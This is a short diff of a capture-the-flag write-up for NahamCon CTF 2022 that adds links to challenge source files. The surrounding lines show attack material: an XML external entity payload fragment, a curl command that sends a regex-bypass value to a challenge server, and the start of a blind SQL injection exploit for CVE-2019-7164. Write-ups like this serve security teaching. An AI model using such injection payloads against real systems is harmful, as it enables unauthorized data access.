@@ -9,12 +9,14 @@
 <root>&test;</root>
 ```
 # Personnel
+[src](Writeup/NahamCon-CTF-2022/src/app.py)
 ## Regex bypass
 ```
 curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data "setting=2&name=.*" http://challenge.nahamcon.com:30349/
 ```
 # Flaskmental Alchemist
 ## CVE-2019-7164: SQLALchemy (order_by) aka Blind SQLi 
+[src](Writeup/NahamCon-CTF-2022/src/fma.zip)
 ```
 #!python3
 from curses import keyname
